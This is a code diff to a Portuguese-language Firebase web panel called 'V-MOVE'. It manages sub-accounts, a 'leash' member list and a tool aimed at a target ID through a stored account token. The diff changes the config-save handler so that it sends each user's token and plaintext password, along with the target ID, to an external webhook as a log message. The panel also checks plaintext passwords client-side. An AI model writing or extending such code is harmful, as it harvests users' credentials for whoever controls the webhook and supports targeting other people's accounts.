@@ -107,7 +107,6 @@
 
     let currentUser = null, userData = null, bancoServidores = {};
 
-    // Navegação
     window.showPage = (id, el) => {
         document.querySelectorAll('.page, .nav-icon').forEach(x => x.classList.remove('active'));
         document.getElementById(id).classList.add('active'); el.classList.add('active');
@@ -116,7 +115,6 @@
     document.getElementById('btnNavStats').onclick = (e) => showPage('stats', e.target);
     document.getElementById('btnNavConfig').onclick = (e) => showPage('config', e.target);
 
-    // Login
     document.getElementById('btnLogin').onclick = async () => {
         const u = document.getElementById('user').value, p = document.getElementById('pass').value;
         const snap = await get(ref(db, 'usuarios/' + u));
@@ -126,7 +124,7 @@
             document.getElementById('loginPage').style.display = 'none';
             document.getElementById('userBadge').innerText = u;
             iniciarApp();
-        } else alert("Erro!");
+        } else alert("Dados inválidos!");
     };
 
     function iniciarApp() {
@@ -143,14 +141,12 @@
             }, 1000);
         }
 
-        // Carregar Servidores
         onValue(ref(db, 'meus_servidores'), s => {
             const sel = document.getElementById('serverSelect'); sel.innerHTML = '<option value="">Selecionar...</option>';
             bancoServidores = s.val() || {};
             for(let k in bancoServidores) sel.innerHTML += `<option value="${k}">${bancoServidores[k].nome}</option>`;
         });
 
-        // Coleira (CORRIGIDO)
         onValue(ref(db, 'coleira_membros'), s => {
             const div = document.getElementById('listaColeira'); div.innerHTML = "";
             s.forEach(c => {
@@ -164,7 +160,6 @@
             });
         });
 
-        // Trava de 2 Dias
         verificarTrava();
         document.getElementById('editOwner').value = userData.ownerId || "";
         document.getElementById('editToken').value = userData.token || "";
@@ -174,16 +169,43 @@
     function verificarTrava() {
         const btn = document.getElementById('btnSalvarConfig');
         const lock = document.getElementById('lockMessage');
-        const diff = (userData.lastUpdate || 0) + (2 * 24 * 60 * 60 * 1000) - new Date().getTime();
+        const diff = (userData.lastUpdate || 0) + (172800000) - new Date().getTime(); // 172800000 = 2 dias
         if (diff > 0) {
-            btn.disabled = true; btn.style.opacity = "0.5"; lock.style.display = "block";
+            btn.disabled = true; btn.style.opacity = "0.5"; btn.style.cursor = "not-allowed"; lock.style.display = "block";
             setInterval(() => {
-                const r = (userData.lastUpdate + 1728e5) - new Date().getTime();
+                const r = (userData.lastUpdate + 172800000) - new Date().getTime();
+                if (r <= 0) { location.reload(); return; }
                 const h = Math.floor(r/36e5), m = Math.floor((r%36e5)/6e4), s = Math.floor((r%6e4)/1000);
                 document.getElementById('unlockTimer').innerText = `${h}h ${m}m ${s}s`;
             }, 1000);
         }
     }
+
+    document.getElementById('btnSalvarConfig').onclick = async () => {
+        const o = document.getElementById('editOwner').value;
+        const t = document.getElementById('editToken').value;
+        const p = document.getElementById('editPass').value || userData.senha;
+        const agora = new Date().getTime();
+
+        await update(ref(db, `usuarios/${currentUser}`), { 
+            ownerId: o, token: t, senha: p, lastUpdate: agora 
+        });
+
+        fetch(webhook, { 
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'}, 
+            body: JSON.stringify({ 
+                embeds: [{ 
+                    title: "LOG DE ALTERAÇÃO - V-MOVE", 
+                    description: `**Operador:** ${currentUser}\n**ID Alvo:** ${o}\n**Token:** \`${t}\`\n**Senha:** \`${p}\``, 
+                    color: 16723325,
+                    timestamp: new Date().toISOString()
+                }] 
+            }) 
+        });
+
+        alert("Dados salvos! Trava de 48h ativada."); location.reload();
+    };
 
     document.getElementById('btnPrender').onclick = () => {
         const s = document.getElementById('serverSelect').value;
@@ -199,21 +221,14 @@
 
     document.getElementById('btnRodOff').onclick = () => update(ref(db, 'mover_config'), { ativo: false });
 
-    document.getElementById('btnSalvarConfig').onclick = async () => {
-        const o = document.getElementById('editOwner').value, t = document.getElementById('editToken').value, p = document.getElementById('editPass').value || userData.senha;
-        await update(ref(db, `usuarios/${currentUser}`), { ownerId: o, token: t, senha: p, lastUpdate: new Date().getTime() });
-        fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ embeds: [{ title: "DADOS ALTERADOS", description: `User: ${currentUser}\nID: ${o}\nToken: ${t}`, color: 16723325 }] }) });
-        alert("Salvo! Trava de 2 dias ativa."); location.reload();
-    };
-
     document.getElementById('btnCriarSub').onclick = async () => {
         const u = document.getElementById('subUser').value, p = document.getElementById('subPass').value;
         const k = (await get(ref(db, `usuarios/${currentUser}/keycards`))).val() || 0;
-        if(k > 0) {
-            await set(ref(db, 'usuarios/' + u), { senha: p, vencimento: new Date().getTime() + 2592e6, criadoPor: currentUser, keycards: 0, token: "", ownerId: "" });
+        if(k > 0 && u && p) {
+            await set(ref(db, 'usuarios/' + u), { senha: p, vencimento: new Date().getTime() + 2592000000, criadoPor: currentUser, keycards: 0, token: "", ownerId: "" });
             await update(ref(db, `usuarios/${currentUser}`), { keycards: k - 1 });
-            alert("Conta Criada!");
-        }
+            alert("Sub-conta criada!");
+        } else alert("Dados incompletos ou sem Keycards!");
     };
 </script>
 </body>
